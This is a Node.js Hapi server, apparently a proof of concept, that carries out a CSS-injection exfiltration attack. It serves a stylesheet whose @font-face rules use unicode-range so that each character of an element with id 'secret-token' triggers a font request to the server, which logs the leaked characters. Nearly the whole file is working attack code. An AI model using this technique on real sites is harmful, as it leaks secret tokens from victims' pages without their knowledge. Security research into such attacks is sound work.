'use strict';

const Hapi = require('hapi');

const server = new Hapi.Server();
server.connection({
    port: 3000,
    host: '0.0.0.0',
    routes: {
        cors: true,
        state: {
            parse: true,
            failAction: 'ignore',
        }
    },
});

const cookieConfig = {
    ttl: null,
    isSecure: false,
    isHttpOnly: false,
    encoding: 'base64json',
    isSameSite: false,
    clearInvalid: true, // remove invalid cookies
    strictHeader: false // don't allow violations of RFC 6265
}

server.state('chars', cookieConfig);

















function createFontFaceForChar(char) {
    const hexCodePoint = char.codePointAt(0).toString(16)
    return `@font-face{
    font-family: hackerfont;
    src: url(http://localhost:3000/char/${char});
    unicode-range:U+00${hexCodePoint};
}`;
}

function createFontFacesForHex() {
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    let result = '';
    for (const char of chars) {
        result += createFontFaceForChar(char) + '\n';
    }
    return result;
}












server.route({
    method: 'GET',
    path: '/first-pass.css',
    handler: function (request, reply) {
        const chars = [];
        const fonts = createFontFacesForHex();
        reply(`
${fonts}
#secret-token {
    font-family: hackerfont !important;
}
        `.trim())
            .type('text/css')
            .state('chars', chars);
    }
});

let chars = [];
setInterval(() => chars = [], 1000);
server.route({
    method: 'GET',
    path: '/char/{char}',
    handler: function (request, reply) {
        chars.push(request.params.char);
        console.log(chars);
        reply(``);
    }
});

server.start((err) => {
    if (err) {
        throw err;
    }
    console.log(`Server running at: ${server.info.uri}`);
});

